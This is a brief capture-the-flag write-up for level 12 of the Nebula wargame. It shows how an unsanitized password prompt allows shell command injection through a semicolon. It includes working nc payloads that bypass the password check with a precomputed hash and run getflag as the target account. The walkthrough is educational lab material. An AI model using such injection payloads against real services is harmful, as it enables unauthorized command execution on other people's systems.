I'm not sure of the goal of this level : is it getting the token by defeating the password, or get the flag ? Let's do both.

The user entry for the password is not sanitized in anyway. By ending the echo command with ; it is possible to make the program execute arbitrary shell commands. So let's get the flag, and redirect output to keep a proof.

Not to break shell invocation, the arbitray command must be ended with a semi-column followed by 'echo' (or whatever) to suit the pipe in "| sha1sum".

The data return by commande execution is truncated to its first 40bytes. To defeat the password mechanism, statring the user entry by the expected hash does the trick.

level12@nebula:~$ echo "4754a4f4bd5787accd33de887b9250a0691dd198; echo " | nc localhost 50001

Password: Congrats, your token is 413**CARRIER LOST**

level12@nebula:~$ echo ";/bin/getflag > /home/flag12/flag12.out; echo " | nc localhost 50001

Password: Better luck next time

level12@nebula:~$ cat ../flag12/flag12.out

You have successfully executed getflag on a target account

